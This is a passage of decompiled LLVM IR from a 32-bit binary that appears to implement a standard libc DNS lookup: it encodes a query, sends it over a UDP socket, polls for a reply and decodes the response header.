  %v3_8056926 = add i32 %v3_805691f, %v2_8056926
  %v4_8056926 = inttoptr i32 %v3_8056926 to i32*
  %v5_8056926 = load i32, i32* %v4_8056926, align 4
  store i32 %v5_8056926, i32* %edx.global-to-local, align 4
  %v2_8056929 = add i32 %v0_805691b, 48
  %v3_8056929 = inttoptr i32 %v2_8056929 to i32*
  store i32 %v5_8056926, i32* %v3_8056929, align 4
  %v0_805692d = load i32, i32* @esp, align 4
  %v1_805692d = add i32 %v0_805692d, 16
  %v1_8056930 = add i32 %v0_805692d, 52
  %v2_8056930 = inttoptr i32 %v1_8056930 to i32*
  %v3_8056930 = load i32, i32* %v2_8056930, align 4
  %v5_8056930 = icmp slt i32 %v3_8056930, 0
  br i1 %v5_8056930, label %dec_label_pc_80568df.dec_label_pc_8056976_crit_edge, label %dec_label_pc_8056937

dec_label_pc_80568df.dec_label_pc_8056976_crit_edge: ; preds = %dec_label_pc_80568df
  %v0_8056976.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056976

dec_label_pc_8056937:                             ; preds = %dec_label_pc_80568df
  store i32 %v3_8056930, i32* %eax.global-to-local, align 4
  %v1_805693b = load i32, i32* @global_var_8064b38.582, align 8
  %v2_805693b = sub i32 %v3_8056930, %v1_805693b
  %v8_805693b = xor i32 %v1_805693b, %v3_8056930
  %v9_805693b = xor i32 %v2_805693b, %v3_8056930
  %v10_805693b = and i32 %v9_805693b, %v8_805693b
  %v11_805693b = icmp slt i32 %v10_805693b, 0
  %v13_805693b = icmp slt i32 %v2_805693b, 0
  %v2_8056941 = icmp eq i1 %v13_805693b, %v11_805693b
  br i1 %v2_8056941, label %dec_label_pc_8056976, label %dec_label_pc_8056943

dec_label_pc_8056943:                             ; preds = %dec_label_pc_8056937
  %v2_8056943 = add i32 %v0_805692d, 12
  %v3_8056943 = inttoptr i32 %v2_8056943 to i32*
  store i32 %v3_8056930, i32* %v3_8056943, align 4
  %v1_8056944 = add i32 %v0_805692d, 8
  %v2_8056944 = inttoptr i32 %v1_8056944 to i32*
  store i32 1025, i32* %v2_8056944, align 4
  %v1_8056949 = add i32 %v0_805692d, 4
  %v2_8056949 = inttoptr i32 %v1_8056949 to i32*
  store i32 ptrtoint (i32* @global_var_805d43c.583 to i32), i32* %v2_8056949, align 4
  %v1_805694e = add i32 %v0_805692d, 28
  %v2_805694e = inttoptr i32 %v1_805694e to i32*
  %v3_805694e = load i32, i32* %v2_805694e, align 4
  %v6_805694e = inttoptr i32 %v0_805692d to i32*
  store i32 %v3_805694e, i32* %v6_805694e, align 4
  %v0_8056952 = call i32 @__GI_strncat()
  store i32 %v0_8056952, i32* %eax.global-to-local, align 4
  %v0_8056957 = load i32, i32* @esp, align 4
  %v1_805695a = add i32 %v0_8056957, 8
  %v2_805695a = inttoptr i32 %v1_805695a to i32*
  store i32 1025, i32* %v2_805695a, align 4
  %v1_805695f = add i32 %v0_8056957, 52
  %v2_805695f = inttoptr i32 %v1_805695f to i32*
  %v3_805695f = load i32, i32* %v2_805695f, align 4
  store i32 %v3_805695f, i32* %edx.global-to-local, align 4
  %v1_8056963 = mul i32 %v3_805695f, 4
  %v2_8056963 = add i32 %v1_8056963, 134630168
  %v3_8056963 = inttoptr i32 %v2_8056963 to i32*
  %v4_8056963 = load i32, i32* %v3_8056963, align 4
  %v6_8056963 = add i32 %v0_8056957, 4
  %v7_8056963 = inttoptr i32 %v6_8056963 to i32*
  store i32 %v4_8056963, i32* %v7_8056963, align 4
  %v1_805696a = add i32 %v0_8056957, 28
  %v2_805696a = inttoptr i32 %v1_805696a to i32*
  %v3_805696a = load i32, i32* %v2_805696a, align 4
  %v6_805696a = inttoptr i32 %v0_8056957 to i32*
  store i32 %v3_805696a, i32* %v6_805696a, align 4
  %v0_805696e = call i32 @__GI_strncat()
  store i32 %v0_805696e, i32* %eax.global-to-local, align 4
  %v0_8056973 = load i32, i32* @esp, align 4
  %v1_8056973 = add i32 %v0_8056973, 16
  br label %dec_label_pc_8056976

dec_label_pc_8056976:                             ; preds = %dec_label_pc_80568df.dec_label_pc_8056976_crit_edge, %dec_label_pc_8056937, %dec_label_pc_8056943
  %v1_8056976 = phi i32 [ %v1_805692d, %dec_label_pc_80568df.dec_label_pc_8056976_crit_edge ], [ %v1_805692d, %dec_label_pc_8056937 ], [ %v1_8056973, %dec_label_pc_8056943 ]
  %v0_8056976 = phi i32 [ %v0_8056976.pre, %dec_label_pc_80568df.dec_label_pc_8056976_crit_edge ], [ %v3_8056930, %dec_label_pc_8056937 ], [ %v0_805696e, %dec_label_pc_8056943 ]
  %v2_8056976 = add i32 %v1_8056976, -4
  %v3_8056976 = inttoptr i32 %v2_8056976 to i32*
  store i32 %v0_8056976, i32* %v3_8056976, align 4
  %v0_8056977 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056977 = add i32 %v1_8056976, -8
  %v3_8056977 = inttoptr i32 %v2_8056977 to i32*
  store i32 %v0_8056977, i32* %v3_8056977, align 4
  %v1_8056978 = add i32 %v1_8056976, -12
  %v2_8056978 = inttoptr i32 %v1_8056978 to i32*
  store i32 1, i32* %v2_8056978, align 4
  %v1_805697a = add i32 %v1_8056976, 184
  store i32 %v1_805697a, i32* @eax, align 4
  %v2_8056981 = add i32 %v1_8056976, -16
  %v3_8056981 = inttoptr i32 %v2_8056981 to i32*
  store i32 %v1_805697a, i32* %v3_8056981, align 4
  %v2_8056982 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_8056982, i32* %eax.global-to-local, align 4
  %v0_8056987 = load i32, i32* @esp, align 4
  %v1_8056987 = add i32 %v0_8056987, 28
  %v2_8056987 = inttoptr i32 %v1_8056987 to i32*
  %v3_8056987 = load i32, i32* %v2_8056987, align 4
  store i32 %v3_8056987, i32* %eax.global-to-local, align 4
  %v1_805698b = add i32 %v0_8056987, 260
  %v2_805698b = inttoptr i32 %v1_805698b to i32*
  %v3_805698b = load i32, i32* %v2_805698b, align 4
  store i32 %v3_805698b, i32* @edx, align 4
  %v1_8056992 = add i32 %v0_8056987, 224
  %v2_8056992 = inttoptr i32 %v1_8056992 to i32*
  store i32 1, i32* %v2_8056992, align 4
  %v0_805699d = load i32, i32* %eax.global-to-local, align 4
  %v1_805699d = load i32, i32* @esp, align 4
  %v2_805699d = add i32 %v1_805699d, 216
  %v3_805699d = inttoptr i32 %v2_805699d to i32*
  store i32 %v0_805699d, i32* %v3_805699d, align 4
  %v1_80569a9 = load i32, i32* @ebx, align 4
  %v2_80569a9 = sub i32 512, %v1_80569a9
  store i32 %v2_80569a9, i32* %eax.global-to-local, align 4
  %v0_80569ab = load i32, i32* @edx, align 4
  %v1_80569ab = load i32, i32* @esp, align 4
  %v2_80569ab = add i32 %v1_80569ab, 220
  %v3_80569ab = inttoptr i32 %v2_80569ab to i32*
  store i32 %v0_80569ab, i32* %v3_80569ab, align 4
  %v0_80569b2 = load i32, i32* @esp, align 4
  %v0_80569b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80569b5 = add i32 %v0_80569b2, 8
  %v3_80569b5 = inttoptr i32 %v2_80569b5 to i32*
  store i32 %v0_80569b5, i32* %v3_80569b5, align 4
  %v1_80569b6 = load i32, i32* @ebx, align 4
  %v2_80569b6 = add i32 %v1_80569b6, %v2_805679e
  %v2_80569ba = add i32 %v0_80569b2, 4
  %v3_80569ba = inttoptr i32 %v2_80569ba to i32*
  store i32 %v2_80569b6, i32* %v3_80569ba, align 4
  %v1_80569bb = add i32 %v0_80569b2, 216
  store i32 %v1_80569bb, i32* @eax, align 4
  %v3_80569c2 = inttoptr i32 %v0_80569b2 to i32*
  store i32 %v1_80569bb, i32* %v3_80569c2, align 4
  %v0_80569c3 = call i32 @__encode_question()
  store i32 %v0_80569c3, i32* %eax.global-to-local, align 4
  %v0_80569c8 = load i32, i32* @esp, align 4
  %v2_80569cb = icmp slt i32 %v0_80569c3, 0
  store i32 %v0_80569c3, i32* @esi, align 4
  br i1 %v2_80569cb, label %dec_label_pc_8056e31, label %dec_label_pc_80569d5

dec_label_pc_80569d5:                             ; preds = %dec_label_pc_8056976
  %v1_80569d5 = add i32 %v0_80569c8, 172
  %v2_80569d5 = inttoptr i32 %v1_80569d5 to i16*
  store i16 2, i16* %v2_80569d5, align 2
  %v1_80569df = load i32, i32* @esp, align 4
  %v2_80569df = add i32 %v1_80569df, -4
  %v3_80569df = inttoptr i32 %v2_80569df to i32*
  store i32 %v0_80569c3, i32* %v3_80569df, align 4
  %v1_80569e0 = add i32 %v1_80569df, 164
  store i32 %v1_80569e0, i32* %eax.global-to-local, align 4
  %v2_80569e7 = add i32 %v1_80569df, -8
  %v3_80569e7 = inttoptr i32 %v2_80569e7 to i32*
  store i32 %v1_80569e0, i32* %v3_80569e7, align 4
  %v1_80569e8 = add i32 %v1_80569df, 32
  %v2_80569e8 = inttoptr i32 %v1_80569e8 to i32*
  %v3_80569e8 = load i32, i32* %v2_80569e8, align 4
  %v5_80569e8 = add i32 %v1_80569df, -12
  %v6_80569e8 = inttoptr i32 %v5_80569e8 to i32*
  store i32 %v3_80569e8, i32* %v6_80569e8, align 4
  %v1_80569ec = add i32 %v1_80569df, -16
  %v2_80569ec = inttoptr i32 %v1_80569ec to i32*
  store i32 10, i32* %v2_80569ec, align 4
  %v5_80569ee = call i32 @inet_pton(i32 -1, i8* %v4_80569ee, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80569ee, i32* %eax.global-to-local, align 4
  %v0_80569f3 = load i32, i32* @esp, align 4
  %v1_80569f3 = add i32 %v0_80569f3, 16
  %tmp47 = icmp slt i32 %v5_80569ee, 1
  br i1 %tmp47, label %dec_label_pc_8056a04, label %dec_label_pc_80569fa

dec_label_pc_80569fa:                             ; preds = %dec_label_pc_80569d5
  %v1_80569fa = add i32 %v0_80569f3, 172
  %v2_80569fa = inttoptr i32 %v1_80569fa to i16*
  store i16 10, i16* %v2_80569fa, align 2
  %v0_8056a04.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056a04

dec_label_pc_8056a04:                             ; preds = %dec_label_pc_80569d5, %dec_label_pc_80569fa
  %v0_8056a1b = phi i32 [ %v1_80569f3, %dec_label_pc_80569d5 ], [ %v0_8056a04.pre, %dec_label_pc_80569fa ]
  %v1_8056a04 = add i32 %v0_8056a1b, 156
  %v2_8056a04 = inttoptr i32 %v1_8056a04 to i16*
  %v3_8056a04 = load i16, i16* %v2_8056a04, align 2
  %v12_8056a04 = icmp eq i16 %v3_8056a04, 10
  %v1_8056a0d = icmp eq i1 %v12_8056a04, false
  %v1_8056a1b = add i32 %v0_8056a1b, 158
  %v2_8056a1b = inttoptr i32 %v1_8056a1b to i16*
  store i16 13568, i16* %v2_8056a1b, align 2
  %v0_8056a25 = load i32, i32* @esp, align 4
  br i1 %v1_8056a0d, label %dec_label_pc_8056a1b, label %dec_label_pc_8056a3b

dec_label_pc_8056a1b:                             ; preds = %dec_label_pc_8056a04
  %v1_8056a28 = add i32 %v0_8056a25, 32
  %v2_8056a28 = inttoptr i32 %v1_8056a28 to i32*
  %v3_8056a28 = load i32, i32* %v2_8056a28, align 4
  %v5_8056a28 = add i32 %v0_8056a25, -16
  %v6_8056a28 = inttoptr i32 %v5_8056a28 to i32*
  store i32 %v3_8056a28, i32* %v6_8056a28, align 4
  %v1_8056a2c = call i32 @inet_addr(i32 -1)
  store i32 %v1_8056a2c, i32* %eax.global-to-local, align 4
  %v1_8056a31 = load i32, i32* @esp, align 4
  %v2_8056a31 = add i32 %v1_8056a31, 176
  %v3_8056a31 = inttoptr i32 %v2_8056a31 to i32*
  store i32 %v1_8056a2c, i32* %v3_8056a31, align 4
  %v0_8056a38 = load i32, i32* @esp, align 4
  %v1_8056a38 = add i32 %v0_8056a38, 16
  br label %dec_label_pc_8056a3b

dec_label_pc_8056a3b:                             ; preds = %dec_label_pc_8056a04, %dec_label_pc_8056a1b
  %v1_8056a3b = phi i32 [ %v1_8056a38, %dec_label_pc_8056a1b ], [ %v0_8056a25, %dec_label_pc_8056a04 ]
  %v0_8056a3b = load i32, i32* @ecx, align 4
  %v2_8056a3b = add i32 %v1_8056a3b, -4
  %v3_8056a3b = inttoptr i32 %v2_8056a3b to i32*
  store i32 %v0_8056a3b, i32* %v3_8056a3b, align 4
  %v1_8056a3c = add i32 %v1_8056a3b, -8
  %v2_8056a3c = inttoptr i32 %v1_8056a3c to i32*
  store i32 17, i32* %v2_8056a3c, align 4
  %v1_8056a3e = add i32 %v1_8056a3b, -12
  %v2_8056a3e = inttoptr i32 %v1_8056a3e to i32*
  store i32 2, i32* %v2_8056a3e, align 4
  %v1_8056a40 = add i32 %v1_8056a3b, 156
  %v2_8056a40 = inttoptr i32 %v1_8056a40 to i16*
  %v3_8056a40 = load i16, i16* %v2_8056a40, align 2
  %v4_8056a40 = zext i16 %v3_8056a40 to i32
  store i32 %v4_8056a40, i32* %eax.global-to-local, align 4
  %v2_8056a48 = add i32 %v1_8056a3b, -16
  %v3_8056a48 = inttoptr i32 %v2_8056a48 to i32*
  store i32 %v4_8056a40, i32* %v3_8056a48, align 4
  %v3_8056a49 = call i32 @socket(i32 -1, i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056a49, i32* %eax.global-to-local, align 4
  %v1_8056a4e = load i32, i32* @esp, align 4
  %v2_8056a4e = add i32 %v1_8056a4e, 36
  %v3_8056a4e = inttoptr i32 %v2_8056a4e to i32*
  store i32 %v3_8056a49, i32* %v3_8056a4e, align 4
  %v0_8056a52 = load i32, i32* @esp, align 4
  %v1_8056a52 = add i32 %v0_8056a52, 16
  %v0_8056a55 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a55 = icmp slt i32 %v0_8056a55, 0
  br i1 %v2_8056a55, label %dec_label_pc_8056a82, label %dec_label_pc_8056a59

dec_label_pc_8056a59:                             ; preds = %dec_label_pc_8056a3b
  %v1_8056a59 = add i32 %v0_8056a52, 172
  store i32 %v1_8056a59, i32* %eax.global-to-local, align 4
  %v0_8056a60 = load i32, i32* @edx, align 4
  %v2_8056a60 = add i32 %v0_8056a52, 12
  %v3_8056a60 = inttoptr i32 %v2_8056a60 to i32*
  store i32 %v0_8056a60, i32* %v3_8056a60, align 4
  %v1_8056a61 = add i32 %v0_8056a52, 8
  %v2_8056a61 = inttoptr i32 %v1_8056a61 to i32*
  store i32 28, i32* %v2_8056a61, align 4
  %v0_8056a63 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a63 = add i32 %v0_8056a52, 4
  %v3_8056a63 = inttoptr i32 %v2_8056a63 to i32*
  store i32 %v0_8056a63, i32* %v3_8056a63, align 4
  %v1_8056a64 = add i32 %v0_8056a52, 36
  %v2_8056a64 = inttoptr i32 %v1_8056a64 to i32*
  %v3_8056a64 = load i32, i32* %v2_8056a64, align 4
  %v6_8056a64 = inttoptr i32 %v0_8056a52 to i32*
  store i32 %v3_8056a64, i32* %v6_8056a64, align 4
  %v3_8056a68 = call i32 @__libc_connect(i32 -1, i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056a68, i32* %eax.global-to-local, align 4
  %v0_8056a6d = load i32, i32* @esp, align 4
  %v2_8056a70 = icmp slt i32 %v3_8056a68, 0
  %v1_8056a72 = icmp eq i1 %v2_8056a70, false
  br i1 %v1_8056a72, label %dec_label_pc_8056a8b, label %dec_label_pc_8056a74

dec_label_pc_8056a74:                             ; preds = %dec_label_pc_8056a59
  %v1_8056a74 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8056a74, i32* %eax.global-to-local, align 4
  %v1_8056a79 = inttoptr i32 %v1_8056a74 to i32*
  %v2_8056a79 = load i32, i32* %v1_8056a79, align 4
  %v11_8056a79 = icmp eq i32 %v2_8056a79, 101
  %v0_8056deb.pre = load i32, i32* @esp, align 4
  br i1 %v11_8056a79, label %dec_label_pc_8056deb, label %dec_label_pc_8056a82

dec_label_pc_8056a82:                             ; preds = %dec_label_pc_8056a74, %dec_label_pc_8056a3b
  %v17_8056a82 = phi i32 [ %v1_8056a52, %dec_label_pc_8056a3b ], [ %v0_8056deb.pre, %dec_label_pc_8056a74 ]
  %v1_8056a82 = add i32 %v17_8056a82, 28
  %v2_8056a82 = inttoptr i32 %v1_8056a82 to i32*
  %v3_8056a82 = load i32, i32* %v2_8056a82, align 4
  %v4_8056a82 = add i32 %v3_8056a82, 1
  store i32 %v4_8056a82, i32* %v2_8056a82, align 4
  br label %dec_label_pc_8056e0c.backedge

dec_label_pc_8056a8b:                             ; preds = %dec_label_pc_8056a59
  %v1_8056a8b = add i32 %v0_8056a6d, 12
  %v2_8056a8b = inttoptr i32 %v1_8056a8b to i32*
  store i32 0, i32* %v2_8056a8b, align 4
  %v0_8056a8d = load i32, i32* @ebx, align 4
  %v1_8056a8d = load i32, i32* @esi, align 4
  %v2_8056a8d = add i32 %v1_8056a8d, %v0_8056a8d
  store i32 %v2_8056a8d, i32* %eax.global-to-local, align 4
  %v2_8056a90 = add i32 %v0_8056a6d, 8
  %v3_8056a90 = inttoptr i32 %v2_8056a90 to i32*
  store i32 %v2_8056a8d, i32* %v3_8056a90, align 4
  %v2_8056a91 = add i32 %v0_8056a6d, 4
  %v3_8056a91 = inttoptr i32 %v2_8056a91 to i32*
  store i32 %v2_805679e, i32* %v3_8056a91, align 4
  %v1_8056a92 = add i32 %v0_8056a6d, 36
  %v2_8056a92 = inttoptr i32 %v1_8056a92 to i32*
  %v3_8056a92 = load i32, i32* %v2_8056a92, align 4
  %v6_8056a92 = inttoptr i32 %v0_8056a6d to i32*
  store i32 %v3_8056a92, i32* %v6_8056a92, align 4
  %v4_8056a96 = call i32 @__libc_send(i32 -1, i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056a96, i32* %eax.global-to-local, align 4
  %v0_8056a9b = load i32, i32* @esp, align 4
  %v1_8056a9b = add i32 %v0_8056a9b, 36
  %v2_8056a9b = inttoptr i32 %v1_8056a9b to i32*
  %v3_8056a9b = load i32, i32* %v2_8056a9b, align 4
  store i32 %v3_8056a9b, i32* %eax.global-to-local, align 4
  %v1_8056a9f = add i32 %v0_8056a9b, 232
  %v2_8056a9f = inttoptr i32 %v1_8056a9f to i16*
  store i16 1, i16* %v2_8056a9f, align 2
  %v0_8056aa9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056aa9 = load i32, i32* @esp, align 4
  %v2_8056aa9 = add i32 %v1_8056aa9, 228
  %v3_8056aa9 = inttoptr i32 %v2_8056aa9 to i32*
  store i32 %v0_8056aa9, i32* %v3_8056aa9, align 4
  %v0_8056ab0 = load i32, i32* @esp, align 4
  %v1_8056ab3 = add i32 %v0_8056ab0, 8
  %v2_8056ab3 = inttoptr i32 %v1_8056ab3 to i32*
  store i32 10000, i32* %v2_8056ab3, align 4
  %v1_8056ab8 = add i32 %v0_8056ab0, 4
  %v2_8056ab8 = inttoptr i32 %v1_8056ab8 to i32*
  store i32 1, i32* %v2_8056ab8, align 4
  %v1_8056aba = add i32 %v0_8056ab0, 228
  store i32 %v1_8056aba, i32* %eax.global-to-local, align 4
  %v3_8056ac1 = inttoptr i32 %v0_8056ab0 to i32*
  store i32 %v1_8056aba, i32* %v3_8056ac1, align 4
  %v0_8056ac2 = call i32 @__libc_poll()
  store i32 %v0_8056ac2, i32* %eax.global-to-local, align 4
  %v0_8056ac7 = load i32, i32* @esp, align 4
  %v1_8056ac7 = add i32 %v0_8056ac7, 16
  %tmp48 = icmp slt i32 %v0_8056ac2, 1
  br i1 %tmp48, label %dec_label_pc_8056deb, label %dec_label_pc_8056ad2

dec_label_pc_8056ad2:                             ; preds = %dec_label_pc_8056a8b
  %v1_8056ad2 = add i32 %v0_8056ac7, 12
  %v2_8056ad2 = inttoptr i32 %v1_8056ad2 to i32*
  store i32 0, i32* %v2_8056ad2, align 4
  %v1_8056ad4 = add i32 %v0_8056ac7, 8
  %v2_8056ad4 = inttoptr i32 %v1_8056ad4 to i32*
  store i32 512, i32* %v2_8056ad4, align 4
  %v2_8056ad9 = add i32 %v0_8056ac7, 4
  %v3_8056ad9 = inttoptr i32 %v2_8056ad9 to i32*
  store i32 %v2_805679e, i32* %v3_8056ad9, align 4
  %v1_8056ada = add i32 %v0_8056ac7, 36
  %v2_8056ada = inttoptr i32 %v1_8056ada to i32*
  %v3_8056ada = load i32, i32* %v2_8056ada, align 4
  %v6_8056ada = inttoptr i32 %v0_8056ac7 to i32*
  store i32 %v3_8056ada, i32* %v6_8056ada, align 4
  %v4_8056ade = call i32 @__libc_recv(i32 -1, i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056ade, i32* @eax, align 4
  %v1_8056ae3 = load i32, i32* @esp, align 4
  %v2_8056ae3 = add i32 %v1_8056ae3, 32
  %v3_8056ae3 = inttoptr i32 %v2_8056ae3 to i32*
  store i32 %v4_8056ade, i32* %v3_8056ae3, align 4
  %v0_8056ae7 = load i32, i32* @esp, align 4
  %v1_8056ae7 = add i32 %v0_8056ae7, 16
  %v7_8056aed = icmp sgt i32 %v4_8056ade, 11
  br i1 %v7_8056aed, label %dec_label_pc_8056af3, label %dec_label_pc_8056da0

dec_label_pc_8056af3:                             ; preds = %dec_label_pc_8056ad2
  %v0_8056af3 = load i32, i32* @ebx, align 4
  %v2_8056af3 = add i32 %v0_8056ae7, 12
  %v3_8056af3 = inttoptr i32 %v2_8056af3 to i32*
  store i32 %v0_8056af3, i32* %v3_8056af3, align 4
  %v0_8056af4 = load i32, i32* @ebx, align 4
  %v2_8056af4 = add i32 %v0_8056ae7, 8
  %v3_8056af4 = inttoptr i32 %v2_8056af4 to i32*
  store i32 %v0_8056af4, i32* %v3_8056af4, align 4
  %v1_8056af5 = add i32 %v0_8056ae7, 84
  store i32 %v1_8056af5, i32* %eax.global-to-local, align 4
  %v2_8056af9 = add i32 %v0_8056ae7, 4
  %v3_8056af9 = inttoptr i32 %v2_8056af9 to i32*
  store i32 %v1_8056af5, i32* %v3_8056af9, align 4
  %v3_8056afa = inttoptr i32 %v0_8056ae7 to i32*
  store i32 %v2_805679e, i32* %v3_8056afa, align 4
  %v0_8056afb = call i32 @__decode_header()
  store i32 %v0_8056afb, i32* %eax.global-to-local, align 4
  %v0_8056b00 = load i32, i32* @esp, align 4
  %v1_8056b00 = add i32 %v0_8056b00, 84
  %v2_8056b00 = inttoptr i32 %v1_8056b00 to i32*
  %v3_8056b00 = load i32, i32* %v2_8056b00, align 4
  store i32 %v3_8056b00, i32* %edx.global-to-local, align 4
  %v2_8056b04 = add i32 %v0_8056b00, 60
  %v3_8056b04 = inttoptr i32 %v2_8056b04 to i32*
  store i32 %v3_8056b00, i32* %v3_8056b04, align 4
  %v0_8056b08 = load i32, i32* @esp, align 4
  %v1_8056b08 = add i32 %v0_8056b08, 16
  %v1_8056b0b = add i32 %v0_8056b08, 72
  %v2_8056b0b = inttoptr i32 %v1_8056b0b to i32*
  %v3_8056b0b = load i32, i32* %v2_8056b0b, align 4
  store i32 %v3_8056b0b, i32* @eax, align 4
  %v0_8056b0f = load i32, i32* %edx.global-to-local, align 4
  %v12_8056b0f = icmp eq i32 %v0_8056b0f, %v3_8056b0b
  %v1_8056b11 = icmp eq i1 %v12_8056b0f, false
  br i1 %v1_8056b11, label %dec_label_pc_8056da0, label %dec_label_pc_8056b17

dec_label_pc_8056b17:                             ; preds = %dec_label_pc_8056af3
  %v1_8056b17 = add i32 %v0_8056b08, 88
  %v2_8056b17 = inttoptr i32 %v1_8056b17 to i32*
  %v3_8056b17 = load i32, i32* %v2_8056b17, align 4
  %v4_8056b17 = icmp eq i32 %v3_8056b17, 0
  br i1 %v4_8056b17, label %dec_label_pc_8056da0, label %dec_label_pc_8056b22

dec_label_pc_8056b22:                             ; preds = %dec_label_pc_8056b17
  %v1_8056b22 = add i32 %v0_8056b08, 112
  %v2_8056b22 = inttoptr i32 %v1_8056b22 to i32*
  %v3_8056b22 = load i32, i32* %v2_8056b22, align 4
  store i32 %v3_8056b22, i32* @eax, align 4
  %v9_8056b26 = icmp eq i32 %v3_8056b22, 3
  %v1_8056b29 = icmp eq i1 %v9_8056b26, false
  br i1 %v1_8056b29, label %dec_label_pc_8056b91, label %dec_label_pc_8056b2b

dec_label_pc_8056b2b:                             ; preds = %dec_label_pc_8056b22
  %v1_8056b2b = add i32 %v0_8056b08, 67
  %v2_8056b2b = inttoptr i32 %v1_8056b2b to i8*
  %v3_8056b2b = load i8, i8* %v2_8056b2b, align 1
  %v4_8056b2b = icmp eq i8 %v3_8056b2b, 0
  %v1_8056b30 = icmp eq i1 %v4_8056b2b, false
  br i1 %v1_8056b30, label %dec_label_pc_8056b81, label %dec_label_pc_8056b32

dec_label_pc_8056b32:                             ; preds = %dec_label_pc_8056b2b
  %v0_8056b32 = load i32, i32* @ecx, align 4
  %v2_8056b32 = add i32 %v0_8056b08, 12
  %v3_8056b32 = inttoptr i32 %v2_8056b32 to i32*
  store i32 %v0_8056b32, i32* %v3_8056b32, align 4
  %v1_8056b33 = add i32 %v0_8056b08, 8
  %v2_8056b33 = inttoptr i32 %v1_8056b33 to i32*
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* %v2_8056b33, align 4
  %v1_8056b38 = add i32 %v0_8056b08, 4
  %v2_8056b38 = inttoptr i32 %v1_8056b38 to i32*
  store i32 134567263, i32* %v2_8056b38, align 4
  %v1_8056b3d = add i32 %v0_8056b08, 200
  store i32 %v1_8056b3d, i32* @esi, align 4
  %v3_8056b44 = inttoptr i32 %v0_8056b08 to i32*
  store i32 %v1_8056b3d, i32* %v3_8056b44, align 4
  %v2_8056b45 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_8056b45, i32* %eax.global-to-local, align 4
  %v0_8056b4a = load i32, i32* @esp, align 4
  %v1_8056b4a = inttoptr i32 %v0_8056b4a to i32*
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* %v1_8056b4a, align 4
  %v1_8056b51 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056b51, i32* %eax.global-to-local, align 4
  %v0_8056b56 = load i32, i32* @global_var_8064b38.582, align 8
  store i32 %v0_8056b56, i32* %ebx.global-to-local, align 4
  %v0_8056b5c = load i32, i32* @esp, align 4
  %v1_8056b5c = inttoptr i32 %v0_8056b5c to i32*
  %v2_8056b5c = load i32, i32* %v1_8056b5c, align 4
  store i32 %v2_8056b5c, i32* @eax, align 4
  %v3_8056b5c = add i32 %v0_8056b5c, 4
  %v1_8056b5d = inttoptr i32 %v3_8056b5c to i32*
  %v2_8056b5d = load i32, i32* %v1_8056b5d, align 4
  store i32 %v2_8056b5d, i32* %edx.global-to-local, align 4
  %v1_8056b5e = add i32 %v0_8056b56, -1
  store i32 %v1_8056b5e, i32* @ebx, align 4
  store i32 1, i32* %v1_8056b5d, align 4
  %v0_8056b61 = load i32, i32* @esi, align 4
  store i32 %v0_8056b61, i32* %v1_8056b5c, align 4
  %v2_8056b62 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_8056b62, i32* %eax.global-to-local, align 4
  %v0_8056b67 = load i32, i32* @esp, align 4
  %v1_8056b6a = add i32 %v0_8056b67, 52
  %v2_8056b6a = inttoptr i32 %v1_8056b6a to i32*
  %v3_8056b6a = load i32, i32* %v2_8056b6a, align 4
  %v4_8056b6a = load i32, i32* @ebx, align 4
  %v5_8056b6a = sub i32 %v3_8056b6a, %v4_8056b6a
  %v11_8056b6a = xor i32 %v4_8056b6a, %v3_8056b6a
  %v12_8056b6a = xor i32 %v5_8056b6a, %v3_8056b6a
  %v13_8056b6a = and i32 %v12_8056b6a, %v11_8056b6a
  %v14_8056b6a = icmp slt i32 %v13_8056b6a, 0
  %v16_8056b6a = icmp slt i32 %v5_8056b6a, 0
  %v2_8056b6e = icmp eq i1 %v16_8056b6a, %v14_8056b6a
  br i1 %v2_8056b6e, label %dec_label_pc_8056b81, label %dec_label_pc_8056b70

dec_label_pc_8056b70:                             ; preds = %dec_label_pc_8056b32
  %v1_8056b70 = add i32 %v0_8056b67, 60
  %v2_8056b70 = inttoptr i32 %v1_8056b70 to i32*
  %v3_8056b70 = load i32, i32* %v2_8056b70, align 4
  store i32 %v3_8056b70, i32* %edx.global-to-local, align 4
  %v3_8056b74 = load i32, i32* %v2_8056b6a, align 4
  %v4_8056b74 = add i32 %v3_8056b74, 1
  store i32 %v4_8056b74, i32* %v2_8056b6a, align 4
  %v0_8056b78 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056b78 = load i32, i32* @esp, align 4
  %v2_8056b78 = add i32 %v1_8056b78, 56
  %v3_8056b78 = inttoptr i32 %v2_8056b78 to i32*
  store i32 %v0_8056b78, i32* %v3_8056b78, align 4
  br label %dec_label_pc_8056e0c.backedge

dec_label_pc_8056b81:                             ; preds = %dec_label_pc_8056b32, %dec_label_pc_8056b2b
  %v0_8056b81 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056b81, i32* %eax.global-to-local, align 4
  %v1_8056b86 = inttoptr i32 %v0_8056b81 to i32*
  store i32 1, i32* %v1_8056b86, align 4
  br label %dec_label_pc_8056e44

dec_label_pc_8056b91:                             ; preds = %dec_label_pc_8056b22
  %v1_8056b91 = icmp eq i32 %v3_8056b22, 0
  %v1_8056b93 = icmp eq i1 %v1_8056b91, false
  br i1 %v1_8056b93, label %dec_label_pc_8056da0, label %dec_label_pc_8056b99

dec_label_pc_8056b99:                             ; preds = %dec_label_pc_8056b91
  %v1_8056b99 = add i32 %v0_8056b08, 120
